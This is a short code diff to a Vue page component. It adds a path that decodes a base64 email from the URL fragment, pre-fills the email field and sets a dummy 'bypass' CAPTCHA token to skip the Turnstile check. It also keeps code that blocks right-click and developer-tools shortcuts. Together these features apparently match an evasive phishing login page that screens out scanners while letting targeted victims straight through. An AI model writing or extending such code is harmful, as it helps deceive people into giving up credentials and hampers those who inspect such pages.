@@ -59,17 +59,23 @@ let turnstileRendered = false
 onMounted(async () => {
   await nextTick()
 
-  // 👇 NEW: Skip CAPTCHA if URL has #email
+  // ✅ NEW: Detect if user already passed validation
   const hash = window.location.hash
   if (hash && hash.startsWith('#')) {
-    const encodedEmail = hash.slice(1)
-    const decoded = atob(encodedEmail)
-    email.value = decoded
-    captchaToken.value = 'bypass'  // Dummy non-null token to skip CAPTCHA screen
-    return
+    try {
+      const encoded = hash.slice(1)
+      const decoded = atob(encoded)
+      if (isValidEmail(decoded)) {
+        email.value = decoded
+        captchaToken.value = 'bypass' // Dummy token to skip CAPTCHA
+        return
+      }
+    } catch (e) {
+      console.warn('[WARN] Invalid base64 hash:', e)
+    }
   }
 
-  // 👇 Already in your code
+  // 🛡️ Security: block right-click and devtools
   document.addEventListener('contextmenu', e => e.preventDefault())
   document.addEventListener('keydown', e => {
     if (
@@ -83,6 +89,7 @@ onMounted(async () => {
 
   renderCaptcha()
 })
+
 
 function renderCaptcha() {
   if (window.turnstile && !turnstileRendered) {
